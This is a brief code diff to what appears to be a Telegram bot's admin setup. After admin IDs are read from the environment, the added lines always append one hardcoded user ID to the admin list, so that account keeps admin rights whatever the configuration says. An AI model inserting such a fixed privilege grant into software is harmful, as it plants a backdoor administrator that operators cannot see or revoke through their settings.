@@ -18,6 +18,9 @@ if _env:
         tok = tok.strip()
         if tok.isdigit():
             ADMIN_IDS.append(int(tok))
+# Ensure requested admin id present
+if 452623935 not in ADMIN_IDS:
+    ADMIN_IDS.append(452623935)
 
 
 def register_admin_commands(dp: Dispatcher, session_factory: async_sessionmaker):
